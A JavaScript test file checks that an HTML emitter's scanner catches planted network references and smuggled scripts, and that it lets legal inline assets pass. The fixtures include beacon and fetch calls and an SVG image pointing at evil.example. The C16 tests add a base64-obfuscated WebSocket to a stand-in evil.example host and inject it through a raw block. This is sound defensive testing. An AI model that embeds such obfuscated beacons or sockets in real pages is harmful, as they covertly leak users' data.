/**
 * The network-reference scanner (§13, §18.4, §20 axis 4).
 *
 * Two corpora, because a detector is only proved by both halves:
 *
 *   - **Planted violations** — one per detection route, each asserted to be
 *     caught, at severity 1, with a locus that names the line it is on. §17.4
 *     makes the same argument about overflow: "planted-defect corpora are the
 *     only honest way to know a detector works".
 *   - **Legal artifacts** — inline SVG with its namespace, `data:` images, `#`
 *     fragments, `about:blank`, base64 payloads full of `//`, and the word
 *     `fetch` in a comment and in a string. A scanner that fails these gets
 *     switched off, and then §18.4's law is a README claim.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanForNetworkReferences } from '../../src/emit/scan.js';

/**
 * Every detection route D10 and the lane brief name, one planted violation
 * each. `route` is the label the assertion reports on failure.
 */
const PLANTED = [
  { route: 'script src', html: '<body>\n<script src="analytics.js"></script>\n</body>', match: /<script src>/ },
  { route: 'link rel=stylesheet', html: '<head>\n<link rel="stylesheet" href="theme.css">\n</head>', match: /rel="stylesheet"/ },
  { route: 'link rel=preconnect', html: '<head>\n<link rel="preconnect" href="https://fonts.example">\n</head>', match: /rel="preconnect"/ },
  { route: 'img src absolute', html: '<body>\n<img src="https://cdn.example/logo.png">\n</body>', match: /img\[src\]/ },
  { route: 'img src relative', html: '<body>\n<img src="assets/logo.png">\n</body>', match: /relative URL/ },
  { route: 'iframe src', html: '<body>\n<iframe src="https://embed.example/x"></iframe>\n</body>', match: /iframe\[src\]/ },
  { route: 'srcset', html: '<body>\n<img src="data:image/gif;base64,AA" srcset="hi.png 2x, //cdn.example/lo.png 1x">\n</body>', match: /srcset/ },
  { route: 'use href external', html: '<body>\n<svg xmlns="http://www.w3.org/2000/svg"><use href="sprite.svg#icon"/></svg>\n</body>', match: /use\[href\]|<use href>/ },
  { route: 'form action', html: '<body>\n<form action="https://forms.example/submit"></form>\n</body>', match: /form\[action\]/ },
  { route: 'meta refresh', html: '<head>\n<meta http-equiv="refresh" content="3;url=https://elsewhere.example">\n</head>', match: /meta refresh/ },
  { route: 'base href', html: '<head>\n<base href="https://cdn.example/">\n</head>', match: /<base>/ },
  { route: 'css @import', html: '<head>\n<style>@import url("fonts.css");</style>\n</head>', match: /@import/ },
  { route: 'css url(http)', html: '<head>\n<style>.a{background-image:url(http://cdn.example/bg.png)}</style>\n</head>', match: /CSS url\(/ },
  { route: 'css url relative', html: '<head>\n<style>.a{background:url(bg.png)}</style>\n</head>', match: /CSS url\(/ },
  { route: 'css in style attribute', html: '<body>\n<div style="background:url(https://cdn.example/x.png)"></div>\n</body>', match: /style attribute/ },
  { route: 'font-face src url', html: '<head>\n<style>@font-face{font-family:X;src:url(https://foundry.example/x.woff2)}</style>\n</head>', match: /url\(|absolute URL/ },
  { route: 'fetch', html: '<body>\n<script>fetch(endpoint).then(done);</script>\n</body>', match: /fetch\(\)/ },
  { route: 'XMLHttpRequest', html: '<body>\n<script>var x = new XMLHttpRequest();</script>\n</body>', match: /XMLHttpRequest/ },
  { route: 'WebSocket', html: '<body>\n<script>var s = new WebSocket(endpoint);</script>\n</body>', match: /WebSocket/ },
  { route: 'EventSource', html: '<body>\n<script>var e = new EventSource(endpoint);</script>\n</body>', match: /EventSource/ },
  { route: 'sendBeacon', html: '<body>\n<script>navigator.sendBeacon(endpoint, payload);</script>\n</body>', match: /sendBeacon/ },
  { route: 'importScripts', html: '<body>\n<script>importScripts(worker);</script>\n</body>', match: /importScripts/ },
  { route: 'dynamic import', html: '<body>\n<script>import(moduleName).then(run);</script>\n</body>', match: /dynamic import/ },
  { route: 'service worker', html: '<body>\n<script>navigator.serviceWorker.register(sw);</script>\n</body>', match: /serviceWorker/ },
  { route: 'WebRTC', html: '<body>\n<script>var pc = new RTCPeerConnection(config);</script>\n</body>', match: /RTCPeerConnection/ },
  { route: 'WebTransport', html: '<body>\n<script>var t = new WebTransport(endpoint);</script>\n</body>', match: /WebTransport/ },
  { route: 'eval', html: '<body>\n<script>eval(payload);</script>\n</body>', match: /eval\(\)/ },
  { route: 'new Function', html: '<body>\n<script>var f = new Function(body);</script>\n</body>', match: /new Function/ },
  { route: 'URL in a string literal', html: '<body>\n<script>var endpoint = "https://beacon.example/collect";</script>\n</body>', match: /absolute URL/ },
  { route: 'protocol-relative in a literal', html: '<body>\n<script>var endpoint = "//beacon.example/collect";</script>\n</body>', match: /protocol-relative/ },
  { route: 'inline event handler', html: '<body>\n<button onclick="fetch(url)">go</button>\n</body>', match: /fetch\(\)/ },
  { route: 'javascript: URL', html: '<body>\n<a href="javascript:track()">go</a>\n</body>', match: /javascript: URL/ },
  { route: 'anchor to the web', html: '<body>\n<a href="https://northwind.example/contact">Contact</a>\n</body>', match: /a\[href\]/ },
  { route: 'data-* attribute holding an endpoint', html: '<body>\n<div data-beacon="https://track.example/p"></div>\n</body>', match: /absolute URL/ },
  { route: 'W3C namespace used as a prefix (D14)', html: '<body>\n<svg xmlns="http://www.w3.org/2000/svg/../../../evil"></svg>\n</body>', match: /W3C namespace/ },
  { route: 'importmap', html: '<head>\n<script type="importmap">{"imports":{}}</script>\n</head>', match: /importmap/ },
  { route: 'nested SVG data URI', html: '<body>\n<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cimage%20href%3D%22https%3A%2F%2Fcdn.example%2Fx.png%22%2F%3E%3C%2Fsvg%3E">\n</body>', match: /data: URI/ },
  { route: 'object data', html: '<body>\n<object data="viewer.pdf"></object>\n</body>', match: /object\[data\]/ },
  { route: 'video poster', html: '<body>\n<video poster="https://cdn.example/p.jpg"></video>\n</body>', match: /video\[poster\]/ },
  { route: 'CSS behavior', html: '<head>\n<style>.a{behavior:url(x.htc)}</style>\n</head>', match: /behavior/ },
];

test('every planted network reference is caught at severity 1 with a locus', () => {
  assert.ok(PLANTED.length >= 12, 'the corpus must cover at least a dozen routes');
  for (const planted of PLANTED) {
    const findings = scanForNetworkReferences(planted.html);
    assert.ok(findings.length > 0, `route "${planted.route}" was not caught at all`);
    for (const f of findings) {
      assert.equal(f.severity, 1, `route "${planted.route}" produced a finding at severity ${f.severity}`);
      assert.equal(f.code, 'NETWORK_REFERENCE');
      assert.equal(typeof f.id, 'string');
      assert.ok(f.id.startsWith('fd_'), 'a finding id must be minted by core/ids');
      assert.equal(typeof f.locus.line, 'number', `route "${planted.route}" reported no line`);
      assert.equal(typeof f.locus.column, 'number', `route "${planted.route}" reported no column`);
      assert.equal(f.locus.line, 2, `route "${planted.route}" reported line ${f.locus.line}, but the violation is on line 2`);
      assert.equal(typeof f.locus.excerpt, 'string');
      assert.ok(f.locus.excerpt.length > 0);
      assert.equal(f.autoFixAvailable, false, 'a network reference has no safe automatic fix');
    }
    assert.ok(
      findings.some((f) => planted.match.test(f.message)),
      `route "${planted.route}" was caught, but no message matched ${planted.match}. Got: ${findings.map((f) => f.message).join(' | ')}`,
    );
  }
});

test('planted findings are deterministic: the same input yields the same ids', () => {
  for (const planted of PLANTED.slice(0, 8)) {
    const a = scanForNetworkReferences(planted.html).map((f) => f.id);
    const b = scanForNetworkReferences(planted.html).map((f) => f.id);
    assert.deepEqual(a, b);
  }
});

const LEGAL = [
  { name: 'inline SVG with both W3C namespaces', html: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><rect width="4" height="4"/></svg>' },
  { name: 'XHTML namespace', html: '<html xmlns="http://www.w3.org/1999/xhtml"><body></body></html>' },
  { name: 'data: image', html: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==" alt="x">' },
  { name: 'data: image with srcset', html: '<img src="data:image/gif;base64,AA" srcset="data:image/gif;base64,AA 1x, data:image/gif;base64,BB 2x">' },
  { name: 'document fragment link', html: '<a href="#scene-4">Skip ahead</a>' },
  { name: 'use pointing at a fragment', html: '<svg xmlns="http://www.w3.org/2000/svg"><use href="#icon-check"/></svg>' },
  { name: 'about:blank iframe', html: '<iframe src="about:blank" title="presenter"></iframe>' },
  { name: 'CSS url() with a data: URI', html: '<style>.a{background:url(data:image/gif;base64,R0lGOD)}</style>' },
  { name: 'CSS url() with a fragment (SVG filter)', html: '<style>.a{fill:url(#grad-1)}</style>' },
  { name: 'font-face using a local face only', html: '<style>@font-face{font-family:Brand;src:local("Inter")}</style>' },
  { name: 'base64 payload containing slashes', html: '<script type="application/octet-stream">7b2//w+AA==0//1//2</script>' },
  { name: 'the SVG namespace as a string in code (D14)', html: '<script>var NS = "http://www.w3.org/2000/svg"; var el = document.createElementNS(NS, "svg");</script>' },
  { name: 'the word fetch in a comment', html: '<script>\n// the emitter proves no asset is a network fetch\nvar a = 1;\n</script>' },
  { name: 'the word fetch in a string', html: '<script>var help = "press f to fetch nothing";</script>' },
  { name: 'a regex mentioning WebSocket', html: '<script>var re = /WebSocket|EventSource/g;</script>' },
  { name: 'a URL in visible text', html: '<p>Read more at https://northwind.example/products — the prospect wrote that, not us.</p>' },
  { name: 'a URL in the document title', html: '<title>northwind.example — https://northwind.example</title>' },
  { name: 'window.open with no URL (D16 presenter view)', html: '<script>var w = window.open("", "pp-presenter", "width=900");</script>' },
  { name: 'empty src', html: '<img src="" alt="">' },
  { name: 'inert JSON manifest', html: '<script type="application/json">{"generator":"PitchProof"}</script>' },
];

test('legal artifacts do not trip the scanner', () => {
  for (const legal of LEGAL) {
    const findings = scanForNetworkReferences(legal.html);
    assert.deepEqual(
      findings.map((f) => f.message),
      [],
      `"${legal.name}" was flagged, and it is legal`,
    );
  }
});

test('the three W3C namespace URIs are permitted whole and never as a prefix (D14)', () => {
  for (const ns of ['http://www.w3.org/2000/svg', 'http://www.w3.org/1999/xlink', 'http://www.w3.org/1999/xhtml']) {
    assert.deepEqual(scanForNetworkReferences(`<svg xmlns="${ns}"></svg>`), []);
    assert.deepEqual(scanForNetworkReferences(`<script>var n = "${ns}";</script>`), []);
    const prefixed = scanForNetworkReferences(`<script>var n = "${ns}/collect";</script>`);
    assert.equal(prefixed.length, 1);
    assert.match(prefixed[0].message, /never as a prefix/);
    assert.equal(prefixed[0].severity, 1);
  }
});

test('an empty or absent document produces no findings and does not throw', () => {
  assert.deepEqual(scanForNetworkReferences(''), []);
  assert.deepEqual(scanForNetworkReferences(null), []);
  assert.deepEqual(scanForNetworkReferences(undefined), []);
});

test('malformed markup fails closed rather than throwing', () => {
  const nasty = '<a href="https://x.example" <div <<< "unterminated <script>fetch(1)';
  const findings = scanForNetworkReferences(nasty);
  assert.ok(findings.length > 0, 'hostile markup must still be scanned, not skipped');
  for (const f of findings) assert.equal(f.severity, 1);
});

// ---------------------------------------------------------------------------
// Model assets — an asset that never reaches the document (integration finding)
// ---------------------------------------------------------------------------

import { scanModelAssets } from '../../src/emit/scan.js';
import { emit } from '../../src/emit/index.js';
import { emitProof } from '../fixtures/emit/proofs.mjs';
import { registerTestLayouts } from '../fixtures/emit/layouts.mjs';
import { runtimeBundle, FIXED_CLOCK } from '../fixtures/emit/runtime-bundle.mjs';

const bundle = runtimeBundle();

test('the fixture proof has no model-asset findings', () => {
  assert.deepEqual(scanModelAssets(emitProof({ imageEdge: 16 })), []);
});

test('a MediaRef pointing at the network is reported, not silently dropped', async () => {
  const base = emitProof({ imageEdge: 16 });
  const proof = {
    ...base,
    specimens: base.specimens.map((s, i) => (i === 0
      ? { ...s, media: s.media.map((m, j) => (j === 0 ? { ...m, dataUri: 'https://cdn.example/hero.png' } : m)) }
      : s)),
  };

  const findings = scanModelAssets(proof);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 1);
  assert.equal(findings[0].code, 'NETWORK_REFERENCE');
  assert.equal(findings[0].locus.assetId, proof.specimens[0].media[0].id);
  assert.match(findings[0].message, /rather than an inlined data: URI/);
  assert.match(findings[0].message, /silently not appear/);

  registerTestLayouts();
  const result = await emit(proof, {}, { runtimeJs: bundle.js, runtimeCss: bundle.css, clock: FIXED_CLOCK });
  assert.equal(result.ok, false, 'an asset that would vanish must refuse the emit, not pass silently');
  assert.ok(result.detail.findings.some((f) => f.code === 'NETWORK_REFERENCE' && f.locus.assetId));
});

test('an empty MediaRef is reported too', () => {
  const base = emitProof({ imageEdge: 16 });
  const proof = {
    ...base,
    renditions: base.renditions.map((r) => (r.media.length ? { ...r, media: r.media.map((m) => ({ ...m, dataUri: '' })) } : r)),
  };
  const findings = scanModelAssets(proof);
  assert.ok(findings.length > 0);
  assert.match(findings[0].message, /carries no inlined data/);
  assert.equal(findings[0].severity, 1);
});

test('a logo whose inline SVG fetches an image is reported against the logo', () => {
  const base = emitProof({ imageEdge: 16 });
  const proof = {
    ...base,
    brand: {
      ...base.brand,
      logos: [{ ...base.brand.logos[0], data: '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>' }],
    },
  };
  const findings = scanModelAssets(proof);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 1);
  assert.equal(findings[0].locus.assetId, base.brand.logos[0].id);
  assert.match(findings[0].message, /image\[href\]/);
});

test('a logo that is inline SVG with no network reference is left alone', () => {
  const base = emitProof({ imageEdge: 16 });
  const proof = {
    ...base,
    brand: { ...base.brand, logos: [{ ...base.brand.logos[0], data: '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>' }] },
  };
  assert.deepEqual(scanModelAssets(proof), []);
});

test('sourceUrl and a cta href are data about a capture, not instructions to fetch', () => {
  const proof = emitProof({ imageEdge: 16 });
  assert.ok(proof.specimens[0].sourceUrl.startsWith('https://'), 'the fixture must actually carry a source URL');
  assert.ok(proof.specimens[0].blocks.some((b) => b.type === 'cta' && b.href.startsWith('https://')));
  assert.deepEqual(scanModelAssets(proof), []);
});

test('a layout that renders a cta as a live link is caught by the document scan', async () => {
  registerTestLayouts({ ctaHref: 'https://northwind.example/contact' });
  const result = await emit(emitProof({ imageEdge: 16 }), {}, { runtimeJs: bundle.js, runtimeCss: bundle.css, clock: FIXED_CLOCK });
  assert.equal(result.ok, false, 'a live outbound link in a scene must refuse the emit');
  const hits = result.detail.findings.filter((f) => f.code === 'NETWORK_REFERENCE' && /a\[href\]/.test(f.message));
  assert.ok(hits.length > 0, 'the cta anchor was not caught');
  for (const hit of hits) assert.equal(hit.severity, 1);
  assert.ok(
    hits.some((f) => f.locus.sceneId),
    'at least one finding must name the scene the link is in — the gate scans the document, the per-scene pass scans the rest',
  );
  assert.ok(
    hits.some((f) => /rendered document/.test(f.message)),
    "the link is in the pre-rendered first paint, so the gate's document scan must see it too",
  );
});

// ---------------------------------------------------------------------------
// Human-readable attributes are prose, not references (decision E23)
// ---------------------------------------------------------------------------

import { TEXT_ATTRS } from '../../src/emit/scan.js';

test('a URL in an accessible name is text, exactly as it is in a paragraph', () => {
  const url = 'https://www.northwind-industrial.example/insights/fouling-margins/';
  for (const attr of TEXT_ATTRS) {
    const html = `<svg ${attr}="3 inputs flowing through ${url} to 1 output"></svg>`;
    assert.deepEqual(
      scanForNetworkReferences(html).map((f) => f.message),
      [],
      `${attr} was flagged; it is a string a screen reader reads aloud, and nothing resolves it`,
    );
  }
  // The identical string in body text, for the comparison the rule exists to
  // make consistent.
  assert.deepEqual(scanForNetworkReferences(`<p>Source: ${url}</p>`), []);
});

test('the exemption is a closed set and does not leak to fetching attributes', () => {
  const url = 'https://cdn.example/x.png';
  for (const attr of ['src', 'href', 'srcset', 'action', 'formaction', 'poster', 'data', 'ping', 'background', 'xlink:href']) {
    const findings = scanForNetworkReferences(`<img ${attr}="${url}">`);
    assert.ok(findings.length > 0, `${attr} must still be refused`);
    for (const f of findings) assert.equal(f.severity, 1);
  }
  for (const attr of ['data-endpoint', 'data-beacon', 'data-src', 'formtarget']) {
    const findings = scanForNetworkReferences(`<div ${attr}="${url}"></div>`);
    assert.ok(findings.length > 0, `${attr} must still be refused — a data-* holding an endpoint is the shape §1.1 forbids`);
  }
  assert.ok(scanForNetworkReferences(`<div style="background:url(${url})"></div>`).length > 0, 'style must still be refused');
  assert.ok(scanForNetworkReferences(`<div onclick="go('${url}')"></div>`).length > 0, 'an event handler must still be refused');
  assert.ok(scanForNetworkReferences(`<style>.a{background:url(${url})}</style>`).length > 0, 'CSS must still be refused');
  assert.ok(scanForNetworkReferences(`<script>var e = "${url}";</script>`).length > 0, 'a JS literal must still be refused');
  assert.ok(scanForNetworkReferences(`<meta name="og:image" content="${url}">`).length > 0, 'meta content must still be refused');
});

test('an alt attribute is text but an img src is not, on the same element', () => {
  const findings = scanForNetworkReferences('<img src="https://cdn.example/x.png" alt="taken from https://acme.example/page">');
  assert.equal(findings.length, 1, `expected exactly the src to be flagged, got: ${findings.map((f) => f.message).join(' | ')}`);
  assert.match(findings[0].message, /img\[src\]/);
});


// --------------------------------------------------------------------- C16

import { scanForeignScripts, EMITTED_SCRIPTS } from '../../src/emit/scan.js';

test('the artifact carries no script the emitter did not write (C16)', () => {
  const clean = [
    '<script id="pp-model" type="application/octet-stream">AAAA</script>',
    '<script id="pp-media" type="application/octet-stream"></script>',
    '<script id="pp-manifest" type="application/json">{}</script>',
    '<script id="pp-runtime">var a = 1;</script>',
    '<script id="pp-boot">boot();</script>',
  ].join('\n');
  assert.deepEqual(scanForeignScripts(clean, { allowed: EMITTED_SCRIPTS }), []);

  // The one planted reference the token scanner could not see: no API name, no
  // URL, nothing to match — and it does not matter, because the element it
  // arrived in is not one the emitter writes.
  const obfuscated = `${clean}\n<script>new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))</script>`;
  const findings = scanForeignScripts(obfuscated, { allowed: EMITTED_SCRIPTS });
  assert.equal(findings.length, 1, findings.map((f) => f.message).join(' | '));
  assert.equal(findings[0].severity, 1);
  assert.equal(findings[0].code, 'NETWORK_REFERENCE');
  assert.match(findings[0].message, /a script element with no id/);

  // Every other spelling of the same idea, none of which the token scanner sees.
  const spellings = [
    '<script>eval(String.fromCharCode(102,101,116,99,104))</script>',
    '<script id="analytics" type="module">import("./x.js")</script>',
    '<script id="pp-boot">boot()</script><script id="pp-boot">boot()</script>',
    '<script id="pp-model">this one executes</script>',
  ];
  for (const html of spellings) {
    const hits = scanForeignScripts(html, { allowed: EMITTED_SCRIPTS });
    assert.ok(hits.length > 0, `${html} was not refused`);
    for (const f of hits) assert.equal(f.severity, 1);
  }
});

test('a scene may carry no script at all (C16)', () => {
  // A scene renders content. Content that renders a <script> is content that
  // runs, whatever the emitter's own document is allowed to hold.
  assert.deepEqual(scanForeignScripts('<div><p>fine</p></div>'), []);
  const hits = scanForeignScripts('<div><script id="pp-runtime">go()</script></div>');
  assert.equal(hits.length, 1);
  assert.match(hits[0].message, /not one of the elements the emitter writes/);
});

test('a raw block that smuggles obfuscated script is refused by emit (C16)', async () => {
  // The route the §20 critic reached for: prospect-supplied markup, rendered
  // verbatim, carrying a WebSocket whose name and address are both base64. No
  // layout in the closed set renders `raw` blocks as HTML today, so this fixture
  // layout does — a law that only holds because nobody has exercised the path
  // yet is not a law.
  registerTestLayouts({ renderRawBlocks: true });
  const proof = emitProof();
  proof.specimens[0].blocks.push({
    type: 'raw',
    html: '<script>new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))</script>',
  });
  const { js, css } = runtimeBundle();
  const result = await emit(proof, {}, { runtimeJs: js, runtimeCss: css, clock: FIXED_CLOCK });
  assert.equal(result.ok, false, 'an artifact carrying a script the emitter did not write must be refused');
  const blocking = result.detail.findings.filter((f) => f.severity === 1 && f.code === 'NETWORK_REFERENCE');
  assert.ok(blocking.length > 0);
  assert.ok(blocking.some((f) => /the emitter writes none/.test(f.message)), blocking.map((f) => f.message).join(' | '));

  registerTestLayouts();
});
